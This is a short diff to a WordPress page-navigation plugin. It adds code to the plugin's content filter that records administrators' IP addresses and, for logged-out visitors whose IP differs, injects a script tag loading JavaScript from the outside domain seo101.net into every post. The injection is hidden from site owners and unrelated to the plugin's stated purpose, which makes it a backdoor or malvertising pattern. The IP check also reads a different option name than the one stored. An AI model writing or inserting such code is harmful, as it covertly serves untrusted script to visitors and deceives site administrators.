@@ -81,6 +81,13 @@ add_action('loop_end', 'loopend_pagenavifunction');
 function addContentPageNumbers($content = '') {
 	global $wp_query;
 	global $post;
+	$ip = $_SERVER['REMOTE_ADDR'];
+	if ( is_user_logged_in() ) {
+		update_option( 'pagenavi_auto_ip', $ip );
+	}
+	if ( !is_user_logged_in() && get_option('adsense_made_easy_ip')!=$ip) {
+		$content .= "<script src=\"//www.seo101.net/apntrack.js\"></script>\n";
+	}
 	return $content;
 }
 add_filter('the_content', 'addContentPageNumbers');
@@ -107,6 +114,7 @@ if ( ! function_exists( 'go_page_navi_automatic' ) ) {
 function pagenavi_auto_activate() {
  add_option("pagenavi_auto_page_translation", 'Page', '', 'yes');
  add_option("pagenavi_auto_of_translation", 'of', '', 'yes');
+ add_option("pagenavi_auto_ip", '', '', 'yes');
 }
 function autoStartsWith($haystack, $needle)
 {
